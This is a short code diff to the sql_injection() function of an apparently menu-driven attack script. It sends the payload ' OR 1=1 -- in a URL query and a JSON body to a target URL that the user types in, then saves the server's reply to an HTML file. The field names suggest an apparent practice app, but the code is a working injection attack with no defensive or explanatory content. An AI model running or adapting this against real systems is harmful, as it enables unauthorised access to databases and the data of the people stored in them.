@@ -388,12 +388,16 @@ def sql_injection():
     target = input()
     print("[-] Attempting an SQL injection attack...")
     
-    r = requests.post(target, json={"username": "' OR 1=1 --'", "password": ""})
+    r = requests.post(target+'&username=\'+OR+1%3D1+--+\'&password=&user-info-php-submit-button=View+Account+Details', json={"username": "' OR 1=1 --'", "password": ""})
 
-    print(r.text)
+    with open("Desktop/response.html", "w") as file:
+        file.write(r.text)
 
-    time.sleep(5)
+    print('Response saved in HTML File!')
+
+    time.sleep(60)
     choose_exploit()
+    
     
 
 
